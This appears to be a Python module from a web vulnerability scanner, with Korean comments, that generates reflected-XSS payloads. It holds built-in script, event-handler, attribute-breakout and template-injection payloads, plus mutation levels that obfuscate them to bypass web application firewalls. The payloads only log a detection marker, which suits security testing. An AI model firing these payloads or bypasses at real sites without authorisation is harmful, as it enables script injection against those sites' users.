from __future__ import annotations

import os
import json
import base64
import random
import re
import string
from functools import lru_cache
from typing import List, Set, Dict, Any

from core.models import Payload

import logging

logger = logging.getLogger(__name__)

# ============================================================
# 마커
# ============================================================
XSS_MARKER_PREFIX = "xSsM4rK3r"


def _generate_marker() -> str:
    rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{XSS_MARKER_PREFIX}{rand_suffix}"


def _generate_char_marker() -> str:
    return "88,83,83"


def _replace_markers(value: str) -> str:
    """
    {{MARKER}} 플레이스홀더 치환.
    하나의 템플릿 내에서는 반드시 동일한 랜덤 마커를 유지하여
    일반 페이로드와 B64 인코딩 페이로드 간의 일관성을 보장함.
    """
    marker = _generate_marker()  # 이번 페이로드에 쓸 고유 마커 딱 1번 생성

    value = value.replace("{{MARKER}}", marker)
    value = value.replace("{{CHAR_MARKER}}", _generate_char_marker())

    # B64_MARKER가 있다면, 방금 만든 'marker'를 인코딩해서 넣음
    if "{{B64_MARKER}}" in value:
        payload = f"console.log(`{marker}`)"  # 백틱 유지
        b64_payload = base64.b64encode(payload.encode()).decode()
        value = value.replace("{{B64_MARKER}}", b64_payload)

    return value


# ============================================================
# ⚠️  JS 위험 함수 추가/변경 시 
# 반드시 아래 3곳을 동시에 수정
# 1. analyzer_1.py: _RE_DANGEROUS_JS
# 2. payloads_1.py: _mutate_cached (Level 2 백틱, Level 3 우회 로직)
# 3. payloads_1.py: _replace_markers (B64 인코딩 대상)
# ============================================================
def _mutate_cached(base_value: str, level: int) -> frozenset[str]:
    """
    레벨별 페이로드 변조 (lru_cache 적용 모듈 수준 함수).
    """
    # ReDoS 방지: 비정상 길이 입력은 원본만 반환
    if len(base_value) > 2000:
        return frozenset({base_value})

    if level <= 0:
        return frozenset({base_value})

    mutations: Set[str] = {base_value}

    # [Level 1] Basic WAF Bypass 
    if level >= 1:
        lvl1: Set[str] = set()
        for val in list(mutations):
            capitalized = re.sub(
                r'<([a-zA-Z])([a-zA-Z0-9]*)',
                lambda m: f"<{m.group(1).upper()}{m.group(2)}",
                val
            )
            lvl1.add(capitalized)

            slashed = re.sub(r'\s+(on\w+\s*=)', r'/\1', val, flags=re.IGNORECASE)
            lvl1.add(slashed)

            lvl1.add(val.replace(" ", "\t"))
            lvl1.add(re.sub(r' (?=on[a-z]+=)', '\n', val))

        mutations.update(lvl1)

    # [Level 2] Advanced WAF Bypass 
    if level >= 2:
        lvl2: Set[str] = set()
        for val in list(mutations):
            # 괄호 대신 백틱 
            if re.search(r'(console\.log)\s*[\(`]', val, re.I):
                modified = re.sub(
                    r'(console\.log)\s*\([\'"]([^\'"]*)[\'\"]\)',
                    lambda m: f"{m.group(1)}`{m.group(2)}`",
                    val
                )
                lvl2.add(modified)

            # JS 유니코드 이스케이프 
            if "console" in val.lower():
                lvl2.add(val.replace("console", "\\u0061lert"))
                lvl2.add(val.replace("console", "\\u0061\\u006cert"))

        mutations.update(lvl2)

    # [Level 3] Obfuscation 
    if level >= 3:
        lvl3: Set[str] = set()
        for val in list(mutations):
            # 1. Base64 eval 난독화 
            if re.search(r'console\.log\s*\([\'"`]\{\{MARKER\}\}[\'"`]\)', val, re.IGNORECASE):
                lvl3.add(re.sub(
                    r'console\.log\s*\([\'"`]\{\{MARKER\}\}[\'"`]\)',
                    "eval(atob(`{{B64_MARKER}}`))",
                    val,
                    flags=re.IGNORECASE
                ))

            # 2. top['con'+'sole']['lo'+'g'] 문자열 분리 
            if re.search(r"console\.log[(`]", val, re.IGNORECASE):
                lvl3.add(re.sub(
                    r"(?i)console\.log",
                    r"top['con'+'sole']['lo'+'g']",
                    val
                ))

            # 3. setTimeout 우회 
            if re.search(r'(console\.log)\s*[(`]', val, re.IGNORECASE):
                lvl3.add(re.sub(
                    r'(?i)((console\.log)\s*[(`].*?[)`])',
                    r"setTimeout(()=>\1)",
                    val
                ))
                lvl3.add(re.sub(
                    r'(?i)((console\.log)\s*[(`].*?[)`])',
                    r"setTimeout(function(){\1})",
                    val
                ))

        mutations.update(lvl3)

    return frozenset(mutations)

# lru_cache는 모듈 수준 함수에 적용 (staticmethod + lru_cache 충돌 회피)
_mutate_cached = lru_cache(maxsize=512)(_mutate_cached)

class PayloadMutator:
    """XSS 페이로드를 동적으로 변조하여 WAF 우회 패턴을 생성합니다.

    주의: mutate()는 반드시 {{MARKER}} 플레이스홀더가 치환되기 *전*
    원본 템플릿 문자열을 받아야 합니다.
    마커 치환(_replace_markers)은 mutate() 호출 이후에 수행하세요.
    """

    @staticmethod
    def mutate(base_value: str, level: int) -> frozenset[str]:
        """모듈 수준 캐시 함수에 위임 (staticmethod + lru_cache 충돌 회피)"""
        return _mutate_cached(base_value, level)


# ============================================================
# 유틸리티
# ============================================================
def _map_risk_level(risk: str) -> str:
    risk_lower = risk.lower()
    if risk_lower in ('critical', 'high'):
        return 'HIGH'
    elif risk_lower == 'medium':
        return 'MEDIUM'
    return 'LOW'


# ============================================================
# 파일 로더 ({{MARKER}} 플레이스홀더 상태로 반환)
# ============================================================
def _load_json_payloads(file_path: str) -> List[Payload]:
    """JSON 파일에서 기본 페이로드 로드 (마커 치환 없이 템플릿 상태 유지)"""
    payloads: List[Payload] = []
    seen: Set[str] = set()

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            data: Dict[str, Any] = json.load(f)

        for category, items in data.items():
            if not isinstance(items, list):
                continue
            for item in items:
                if not isinstance(item, dict):
                    continue
                raw_value = item.get("value", "")
                risk = item.get("risk_level", "HIGH")
                impact = item.get("impact", "")
                attack_type = f"reflected_xss:{category}"
                if impact:
                    attack_type += f":{impact}"

                if raw_value and raw_value not in seen:
                    seen.add(raw_value)
                    payloads.append(Payload(
                        value=raw_value,
                        attack_type=attack_type,
                        risk_level=_map_risk_level(risk),  # 정규화
                    ))

    except Exception as e:
        logger.info(f"[-] [XSS] JSON 페이로드 로드 실패: {e}")

    return payloads


def _load_txt_payloads(file_path: str) -> List[Payload]:
    """TXT 파일에서 기본 페이로드 로드 (마커 치환 없이 템플릿 상태 유지)"""
    payloads: List[Payload] = []
    seen: Set[str] = set()

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue

                if ":::" in line:
                    parts = [p.strip() for p in line.split(":::")]
                    raw_value = parts[0]
                    attack_type = parts[1] if len(parts) > 1 else "reflected_xss"
                    risk_raw = parts[2] if len(parts) > 2 else "HIGH"
                else:
                    raw_value = line
                    attack_type = "reflected_xss"
                    risk_raw = "HIGH"

                if raw_value and raw_value not in seen:
                    seen.add(raw_value)
                    payloads.append(Payload(
                        value=raw_value,
                        attack_type=attack_type,
                        risk_level=_map_risk_level(risk_raw),  # 수정: 정규화 추가 (기존엔 raw 문자열 그대로 사용)
                    ))

    except Exception as e:
        logger.info(f"[-] [XSS] TXT 페이로드 로드 실패: {e}")

    return payloads


def _get_builtin_payloads() -> List[Payload]:
    """내장 페이로드 ({{MARKER}} 플레이스홀더 상태 유지)"""
    templates = [
        # 기본
        ("<script>console.log('{{MARKER}}')</script>", "reflected_xss:basic", "HIGH"),
        ("<script>console.log(document.domain)</script>", "reflected_xss:basic", "HIGH"),
        # 이벤트 핸들러
        ("<img src=x onerror=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
        ("<svg onload=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
        ("<svg/onload=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
        ("<body onload=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
        ("<input onfocus=console.log('{{MARKER}}') autofocus>", "reflected_xss:event_handler", "HIGH"),
        ("<details open ontoggle=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
        ("<video><source onerror=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
        ("<marquee onstart=console.log('{{MARKER}}')>", "reflected_xss:event_handler", "HIGH"),
        # 속성 탈출
        ("'\"><script>console.log('{{MARKER}}')</script>", "reflected_xss:attribute_breakout", "HIGH"),
        ("'><img src=x onerror=console.log('{{MARKER}}')>", "reflected_xss:attribute_breakout", "HIGH"),
        ("\" onmouseover=\"console.log('{{MARKER}}')\"", "reflected_xss:attribute_injection", "MEDIUM"),
        # JavaScript 컨텍스트
        ("</script><script>console.log('{{MARKER}}')</script>", "reflected_xss:tag_breakout", "HIGH"),
        ("';console.log('{{MARKER}}');//", "reflected_xss:js_breakout", "HIGH"),
        ("\";console.log('{{MARKER}}');//", "reflected_xss:js_breakout", "HIGH"),
        # URI
        ("<a href=\"javascript:console.log('{{MARKER}}')\">click</a>", "reflected_xss:protocol", "MEDIUM"),
        ("<iframe src=\"javascript:console.log('{{MARKER}}')\">", "reflected_xss:protocol", "HIGH"),
        # WAF 우회 (내장)
        ("<ScRiPt>console.log('{{MARKER}}')</sCrIpT>", "reflected_xss:waf_bypass", "MEDIUM"),
        ("<svg\tonload=console.log('{{MARKER}}')>", "reflected_xss:waf_bypass", "HIGH"),
        ("<svg\nonload=console.log('{{MARKER}}')>", "reflected_xss:waf_bypass", "HIGH"),
        ("<img src=x onerror=console.log`'{{MARKER}}'`>", "reflected_xss:waf_bypass", "HIGH"),
        # 인코딩
        ("<img src=x onerror=&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;('{{MARKER}}')>", "reflected_xss:encoding", "HIGH"),
        # CSTI
        ("{{constructor.constructor('console.log(\"{{MARKER}}\")')()}}", "reflected_xss:csti", "HIGH"),
        # Polyglot
        ("'><img src=x onerror=console.log('{{MARKER}}')><\"", "reflected_xss:polyglot", "HIGH"),
    ]

    return [
        Payload(value=v, attack_type=at, risk_level=_map_risk_level(r))
        for v, at, r in templates
    ]


# ============================================================
# 기본 페이로드 로더 — 파일 I/O만 캐싱
# (마커 미치환 템플릿 상태로 반환)
# ============================================================
@lru_cache(maxsize=1)
def _load_base_payloads() -> tuple[Payload, ...]:
    """기본 페이로드 로드 (캐싱). 반환값은 {{MARKER}} 플레이스홀더 상태."""
    # 1. JSON
    json_path = os.path.join("config", "payloads", "xss", "xss.json")
    if os.path.exists(json_path):
        payloads = _load_json_payloads(json_path)
        if payloads:
            logger.info(f"[+] [XSS] JSON 페이로드 로드: {len(payloads)}개")
            return tuple(payloads)

    # 2. TXT
    txt_path = os.path.join("config", "payloads", "xss.txt")
    if os.path.exists(txt_path):
        payloads = _load_txt_payloads(txt_path)
        if payloads:
            logger.info(f"[+] [XSS] TXT 페이로드 로드: {len(payloads)}개")
            return tuple(payloads)

    # 3. 내장
    payloads = _get_builtin_payloads()
    logger.info(f"[+] [XSS] 내장 페이로드 사용: {len(payloads)}개")
    return tuple(payloads)


# ============================================================
# 메인 API
# ============================================================
def get_xss_payloads(evasion_level: int = 0) -> tuple[Payload, ...]:
    """
    페이로드 로드 및 변조 적용.
    evasion_level: 0=off, 1=basic WAF bypass, 2=advanced/encoding, 3=obfuscation

    처리 순서:
      1. _load_base_payloads()   → {{MARKER}} 템플릿 상태 (캐싱)
      2. PayloadMutator.mutate() → 변조 (템플릿 상태에서 수행, 결과 캐싱)
      3. _replace_markers()      → 실제 마커값으로 치환
    """
    base_payloads = _load_base_payloads()

    result: List[Payload] = []
    
    seen_templates: Set[str] = set()

    for base in base_payloads:
        # Step 1. 변조 ({{MARKER}} 플레이스홀더 상태에서, 결과 캐싱)
        mutations = PayloadMutator.mutate(base.value, evasion_level)

        for mutated_template in mutations:
            if mutated_template in seen_templates:
                continue
            seen_templates.add(mutated_template)

            # Step 2. 마커 치환 (변조 후)
            final_value = _replace_markers(mutated_template)
            if final_value:
                result.append(Payload(
                    value=final_value,
                    attack_type=base.attack_type,
                    risk_level=base.risk_level,
                ))

    if evasion_level > 0:
        logger.info(f"[+] [XSS] 변조 적용 (Level {evasion_level}): {len(base_payloads)} → {len(result)}개")

    return tuple(result)
